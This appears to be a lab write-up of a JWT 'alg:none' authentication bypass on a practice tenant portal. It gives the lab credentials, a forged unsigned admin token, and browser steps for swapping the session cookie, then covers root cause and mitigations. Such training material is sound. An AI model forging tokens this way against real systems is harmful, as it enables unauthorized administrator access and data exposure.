---
title: "JWT alg:none Authentication Bypass to Admin Access | EverGreen"
date: 2026-05-10 10:15:00 +0530
categories: [Web Security, Broken Authentication]
tags: [jwt, alg-none, authentication-bypass, privilege-escalation, insecure-authentication, session-management, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/evergreen-auth-bypass.webp
  alt: JWT alg none authentication bypass in Evergreen tenant portal
---

## Overview

Evergreen Property Management provided a resident tenant portal for users to manage their accounts and view property-related information. During testing, the application issued a JWT-based session cookie after authentication.

Analysis of the JWT implementation revealed that the backend accepted tokens using the `alg:none` algorithm. By modifying the JWT payload and removing signature validation entirely, it was possible to escalate privileges from a normal tenant account to administrator access.

The vulnerability resulted in a complete authentication bypass and unauthorized access to the admin dashboard.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/mystery-challenges/evergreen)

---

## Objective

Gain administrative access to the Evergreen tenant portal by exploiting insecure JWT verification.

---

## Provided Credentials

The lab provided a tenant account for portal access:

```text
Email: j.cardenas@evergreenprop.lab
Password: nottoday2024
```

---

## Initial Authentication

After logging into the resident portal, the session cookie could be observed in the browser storage.

### Cookie Name

```text
evergreen_session
```

### Original JWT

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjE4NCwicm9sZSI6InRlbmFudCIsImVtYWlsIjoiai5jYXJkZW5hc0BldmVyZ3JlZW5wcm9wLmxhYiIsIm5hbWUiOiJKb25hcyBDYXJkZW5hcyIsImV4cCI6MTc3ODQ4ODk1Mn0.lfXucetBDItelG4kbyjQjqtzihLjlJV9qD3T6y3rdb0
```

---

## JWT Analysis

Decoding the token revealed the following payload:

```json
{
  "sub": 184,
  "role": "tenant",
  "email": "j.cardenas@evergreenprop.lab",
  "name": "Jonas Cardenas",
  "exp": 1778488952
}
```

The JWT originally used the `HS256` signing algorithm.

The application failed to properly enforce signature validation and accepted tokens using the insecure `alg:none` option.

---

## Exploitation

The JWT header was modified from:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

to:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The role claim was also modified:

```json
"role": "admin"
```

---

## Forged JWT

Modified unsigned token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjE4NCwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJqLmNhcmRlbmFzQGV2ZXJncmVlbnByb3AubGFiIiwibmFtZSI6IkpvbmFzIENhcmRlbmFzIiwiZXhwIjoxNzc4NDg4OTUyfQ.
```

The trailing `.` is important because JWTs using `alg:none` still follow the structure:

```text
HEADER.PAYLOAD.
```

Without the trailing dot, the token format would be invalid.

---

## Session Hijacking

Using browser DevTools:

1. Open `Inspect`
2. Navigate to `Storage` or `Application`
3. Locate the `evergreen_session` cookie
4. Replace the existing JWT with the forged token
5. Refresh the page

After refreshing, the application trusted the modified token and granted administrator access.

---

## Proof of Exploitation

Successful privilege escalation exposed the administrator dashboard.

The flag was accessible directly within the admin interface:

```text
WEBVERSE{.....}
```

---

## Impact

This vulnerability allowed complete authentication bypass and privilege escalation.

An attacker could:

- Forge arbitrary user sessions
- Escalate from tenant to administrator
- Access privileged dashboards
- Bypass authentication controls
- Potentially access sensitive tenant or operational data

Because JWTs were trusted without signature validation, the entire authentication model became ineffective.

---

## Root Cause

The backend accepted JWTs using the insecure `alg:none` algorithm.

This typically occurs when:

- JWT libraries are misconfigured
- Signature verification is disabled
- The application trusts client-controlled JWT headers
- Legacy debug or development verification paths remain enabled in production

---

## Mitigation

Developers should:

- Explicitly disallow `alg:none`
- Enforce strict JWT signature verification
- Hardcode accepted algorithms server-side
- Reject unsigned tokens entirely
- Use modern JWT libraries with secure defaults
- Remove legacy debug authentication branches from production systems

---

## Real-World Insight

The `alg:none` JWT vulnerability is a classic authentication flaw that has appeared in multiple real-world applications due to improper JWT validation logic.

Applications should never trust the algorithm specified by the client-controlled JWT header. The server must independently enforce the expected signing algorithm and verify the token signature before trusting any claims.